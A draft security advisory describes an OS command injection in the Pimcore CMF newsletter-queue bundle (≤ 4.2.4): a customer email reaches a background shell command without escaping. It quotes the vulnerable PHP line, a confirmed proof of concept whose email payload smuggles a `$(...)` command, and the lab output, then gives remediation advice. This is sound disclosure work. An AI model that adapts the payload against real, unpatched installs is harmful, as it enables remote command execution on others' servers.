# OS Command Injection — Pimcore CMF newsletter queue (unescaped customer email)

**Advisory ID:** 2026-005 · **Researcher:** anon87111 · **Status:** Draft
**Product:** `pimcore/customer-management-framework-bundle` **≤ 4.2.4** (GPL, EOL — repo archived, package abandoned)
**Class:** CWE-78 OS Command Injection · **Severity:** High (conditional) —
`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` (~7.0)

## Summary
When the CMF newsletter-sync feature is enabled, a customer's **email address** is interpolated **unescaped** into
a shell command the bundle runs in the background on every request that saves a newsletter-aware customer. An email
containing shell metacharacters therefore yields **OS command execution** on the server. The attacker only needs to
set a customer email (e.g. via the REST API, or a signup/registration that creates/updates a customer).

## Affected component
`src/Newsletter/Queue/DefaultNewsletterQueue.php:100` — `executeImmidiateAsyncQueueItems()`:
```php
$cmd = sprintf($php.' '.PIMCORE_PROJECT_ROOT."/bin/console cmf:newsletter-sync --process-queue-item='%s'", $item->toJson());
Console::execInBackground($cmd);     // background shell exec — NO escapeshellarg()
```
`$item->toJson()` embeds the customer `email` inside the single-quoted shell argument with no escaping. A single
quote in the email closes the quote; `$(...)` / backticks then execute.

## Reachability
`DefaultCustomerSaveManager::handleNewsletterQueue()` calls `enqueueCustomer(..., immediate=true)` when
`$customer instanceof NewsletterAwareCustomerInterface && saveOptions->isNewsletterQueueEnabled()`. The immediate
flag (`newsletterQueueImmediateAsyncExecutionEnabled`) is `defaultTrue`; the enabling gate (`newsletterSyncEnabled`,
wired into `SaveOptions`) is off by default but **on for any install using the documented MailChimp/newsletter
integration**. The queued item runs on `kernel.terminate` (`NewsletterTerminateListener`). `email` is the only
attacker-controlled field in `toJson()`.

## Proof of Concept (confirmed)
Lab: Pimcore 11 + CMF 4.2.4 (Docker). The PoC puts a crafted email into a queue item — exactly the state
`addImmidiateAsyncQueueItem()` produces on a customer save — and invokes the vulnerable method:
```php
$payload = "x'$(touch /tmp/cmf_rce_poc)'@y.com";
$item = new DefaultNewsletterQueueItem(1, null, $payload, 'update', 123);
// inject into the queue's private $immidateAsyncQueueItems, then:
$queue->executeImmidiateAsyncQueueItems();
```
Observed:
```
injected email: x'$(touch /tmp/cmf_rce_poc)'@y.com
*** RCE CONFIRMED: /tmp/cmf_rce_poc created by injected shell command ***
-rw-rw-rw- 1 root root 0 ... /tmp/cmf_rce_poc
```
The injected `$(touch …)` executed — the unescaped email reached the shell. (The PoC exercises the sink directly;
the email→queue-item path on customer save is established from the source above.)

## Impact
Remote OS command execution as the web/worker user, on installs running CMF newsletter sync.

## Affected / patched
Affected: `<= 4.2.4`. Patched: none (GPL bundle EOL).

## Remediation
`escapeshellarg($item->toJson())`, or pass the payload via stdin / a Symfony `Process` argument array (no shell).

## Disclosure
GPL repo archived (2026-04-20) / package abandoned → no vendor channel; self-published + MITRE CVE request.

## Credit
anon87111
